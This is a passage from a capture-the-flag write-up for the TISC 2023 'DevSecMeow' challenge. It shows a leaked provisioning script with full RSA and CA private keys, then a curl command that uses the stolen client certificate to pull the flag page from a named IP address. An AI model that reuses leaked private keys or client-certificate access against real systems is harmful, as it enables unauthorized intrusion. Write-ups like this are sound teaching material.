tBVwu4XwOlITWo1Te/wmP/zai6FYlyLIEpCD6LJ9/sajqxYtaslSHlgIjqTI9VKo
nahEbj8Xa7TMrNFbr2NY5z3oLypICrqE/zPuOgMBM6DX5cnlfqeAwIVnL5QxQoQe
ocwSDeAXDIcNdzHelUCgBiSjLw055hwNsLx/ZQ6Yu7Y4S0hE1CZZ3g++WoH/kLxi
i6pHoaTHsB4NIz5DYiQEydywzjnX7FAXqYwf4iZYLIiS9M6iXXB1OMBgtINVxglA
cBU54+I4u4h/CUkjPYPs8x11AgMBAAEwDQYJKoZIhvcNAQELBQADggEBACoCQZ5e
8a4RgMOoeqiaiKF4xVK8KQGtEUKjIeYT4LIeVFRhpB5m/RWxj2dshHNr1bJWFP+H
irecUisqLkpmAZRTGGbK98hN1muV85LRsyQTfesVNCT8Az3g0UUFN6rQdMoAqn97
lA/pK4N7Nxi7HDhaipZQ6uPcGVQkrcKOScxq7Y1IJ1Nq0qpKlrx2QIzB3rpE1Cpm
eYX1qHqgfLc+WGbwFfWF9raSG0bbLmB+krXtTUEqorTtr4RUQ3JCh0moJ5ToUgzc
qaYdKV87JdAsh88Dc8R4xEy+CgmP0Tecsdu4vp+QGLIFyKVXV1nPWF2ihz8XelLe
KiNii7b6V43HSrA=
-----END CERTIFICATE-----

EOL
cat <<\EOL > /etc/nginx/server.key
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----

EOL
cat <<\EOL > /etc/nginx/ca.crt
-----BEGIN CERTIFICATE-----
MIIDITCCAgmgAwIBAgIUQ3SN/Ic7T2x1v6cA6gKPUxNSlNgwDQYJKoZIhvcNAQEL
BQAwIDEeMBwGA1UEAwwVZGV2c2VjbWVvdy1wcm9kdWN0aW9uMB4XDTIzMDcyMTE0
NTA0MFoXDTI0MDcyMDE0NTA0MFowIDEeMBwGA1UEAwwVZGV2c2VjbWVvdy1wcm9k
dWN0aW9uMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxNkskbb7nqRD
nVMFJrWQUYuCURyYjncGVZTEFzO1cOOEAR35DmcRuVgWTACUJdRRqb6lL/7Vbfgm
1TV8vj7x/qNciEvd4/NzotlBXYCXJLilLFUydxuEqzpxX9fCGxQJ0nsKDswYuUpi
7ire952y8YAlu/DAApfwm/K8rS2edvvJ22wr1QznmEIedf3GFI3giFgyiB81bmqs
W+vLwd599seSVc48sm4VdIbw1KxQrQVU9Rwr7VyR7frFIitPIpTRfD6P/vZAZSmd
icPAq+2iDGj1YEy4AfRsn+ah7XQqp5ZC4iZccZidHGVlHSmsDXqJ2kpweuYoVCzy
HjMIuPqkDwIDAQABo1MwUTAdBgNVHQ4EFgQUr87qLf+IfGrfkYajdItqMFzby78w
HwYDVR0jBBgwFoAUr87qLf+IfGrfkYajdItqMFzby78wDwYDVR0TAQH/BAUwAwEB
/zANBgkqhkiG9w0BAQsFAAOCAQEAum41R46j6OlqmqdvEgt3D5pCsTa7fwfbvdqp
FgSlsGrwtRzAxETYPj6d+kYliFI/Z46tE3x15F5zisPPT3F/HjqzLPJBvCQWjiHW
+nRniqn5OzwgCsKB8kIVO01tE02ibWyIzL15s8IvzNTDH/WUUf1YvN/QKrvr7NC1
fGui/34w/Sikc1ckuayOM6B6yhf2WoCtC/txaGBxSa95tqSADxiw2X4ru7vuDqJO
TNVZrU3IkDCUhRSxvcesm4of0B21GCmpcUAU75A+UF3sl8jFTNf8oMFZzW17W4bg
tMdad2Pvl9IL3bWjT0uWMOU7uFWHRFCKEVrzCzJ6sUdyamwsLg==
-----END CERTIFICATE-----

EOL
cat <<\EOL > /etc/nginx/ca.key
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDE2SyRtvuepEOd
UwUmtZBRi4JRHJiOdwZVlMQXM7Vw44QBHfkOZxG5WBZMAJQl1FGpvqUv/tVt+CbV
NXy+PvH+o1yIS93j83Oi2UFdgJckuKUsVTJ3G4SrOnFf18IbFAnSewoOzBi5SmLu
Kt73nbLxgCW78MACl/Cb8rytLZ52+8nbbCvVDOeYQh51/cYUjeCIWDKIHzVuaqxb
68vB3n32x5JVzjyybhV0hvDUrFCtBVT1HCvtXJHt+sUiK08ilNF8Po/+9kBlKZ2J
w8Cr7aIMaPVgTLgB9Gyf5qHtdCqnlkLiJlxxmJ0cZWUdKawNeonaSnB65ihULPIe
Mwi4+qQPAgMBAAECggEBAKABg7fiC/90uD0uWXaQiQGvq7rwypSq7SwtY4MUlfxw
A0HBMkvhvcdxcZZPthxVzBd1DuLHeocL+cy+0Gn30k7QTQvA11lN74XEoNw3BSRl
LmWtzvqAFMP2Gmf0giPuktlTB+blQYeDjozXriuKNQUWzBVLaVfyVzL8CR+fgDpn
nUai7P0thT8MjxXesVvf1jkq4yZqPMOLNLYEuUn5G+OkNCHoqrc4Ud/Ft1lqd4f1
yvJ+9IDBZ298+HhCnlwyZ+ipTZFTcgzV6o/f4Hq0hfiqGx0es0Gt+jtkpR99AS4A
xGGU9CMy2bKk7k5aaoin7dljiIcTrCkWsnCgaVHPNLkCgYEA4bW0AmHWFmzABT/T
TzzgQKJsFvwvKDWOJiDVTczZlTfXeWcM9WQtAecAk2ZxAZqtqXEatzhWsGIvmxMr
zMKz9RLxxRsttV4xzRwDfcjKzRuZAV0xXPsIuaZPpzrqCX8uFrvhijf8prWuLFZr
2mC7kxVVpfDjO68e74YJVSKmOgUCgYEA30Pua0vOPXFL2h8TcbjG9FyTxid4OQWE
s1IiLYRw3jVVWlJ2gAlZ4ey+zTG162zV4V2yHrZF23es45yoWgSRZkxufkQY9CJi
XMXf0qdyC1lVh/naJXdz5AYr5KwyDv9UKjJc6vubcuSmD6h6H3QOgkZeoCt75lwy
jKwwSRRL/gMCgYB4AoLp2VdZqQ0YPW1/biDWfQX32rLAMGmagE6qBUeTfZOGK3LK
by83GbpGpWtkrPe1ZjwMO1psgmhJjhH113iT0DTY1rChBKp6InEAymh6Ujgyb3i1
tYxYGcO0aTDTR9oboF41fbtKcMNhM7o47MIPXIKjrsdDjsNmG+COcdPseQKBgQC5
niqb/dwrbQQZBfkOdQbDpiwddDcZgSMASuqrWQ7VTxX1D9YBQMT/depzgj6yyjtP
MKyjp/qQKgENAvNcU6vmlujOBSOR5PxOERyycA/6q3zWnbzlpVguXYskhJzhpxl8
M37YxfJJJRuCrRlLCRv+5y5Ij55kuIY2Ofmy6DL9rQKBgQDefTgiSKVIlMpZRiGt
VOAD0MFda/k9tpTPT9HdlL4b44mkNzPailJATH0XLDqSwuXn4wJEgMAwqbM8CGSo
Opar3fixSriKkwuTuDy8fM1dbpjYCi8rKswGULTvpFHJQZSDu4+sCDxbZUv9VTAS
aUwjOeYyIZiB+SQt/kUUZm1acA==
-----END PRIVATE KEY-----

EOL
aws s3 cp s3://devsecmeow2023flag2/index.html /tmp/
sudo cp /tmp/index.html /var/www/html
rm /tmp/index.html
sudo systemctl restart nginx
```

There were several things to note in this script:
1. Server private key (`server.key`) and certificate (`server.crt`) 
2. CA private key (`ca.key`) and certificate (`ca.crt`)
3. The reverse proxy configuration to `flag_server`, which was a virtual host hosted on the same web server and was serving pages from `/var/www/html`
4. The `index.html` from the S3 bucket `devsecmeow2023flag2` that was copied to `/var/www/html`

With the `server.key` and `server.crt` that should already been signed by the production environment's issuer, they could be used to access the production web server to get the second part of the flag like so:

```bash
$ curl -k --cert ./server.crt --key server.key https://54.255.155.134/
  <html>
    <head>
        <title>DevSecMeow</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
          integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
          crossorigin="anonymous"></script>
        <style>
            body,
            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
            font-family: "Karma", sans-serif
            }
        
            .w3-bar-block .w3-bar-item {
            padding: 20px
            }
        
            .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            }

            @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
            }
        </style>
      </head>
      <header>
  
        <div class="p-5 text-center bg-light">
          
            
         
            <h4 class="mb-3">ᓚᘏᗢ</h4>
            <p class="lead text-muted">Congratulations on completing the challenge!</p>
            <p class="lead text-muted">Flag2: yOuR_d3vSeCOps_P1peL1nEs!!<##:3##>}</p>
          </div>
        
      </header>
    <body>
        <main role="main">
            
            <div class="bg-light">
              <div class="container">
          
                <div class="row">
                  <div class="col-md-4">
                    <div class="mb-4">
                    </div>
                  </div>
                  <div class="col-md-4">
                    <div class="mb-4">
                        <img class="w-100 shadow-1-strong rounded mb-4" src="data:image/jpeg;base64,..." />
                    </div>
                  </div>
                  <div class="col-md-4">
                    <div class="mb-4">
                    </div>
                  </div>
                </div>
              </div>
          
          </main>
          

    </body>

</html>
```

> `flag2` is `yOuR_d3vSeCOps_P1peL1nEs!!<##:3##>}`

## Flag

`TISC{pr0tecT_yOuR_d3vSeCOps_P1peL1nEs!!<##:3##>}`
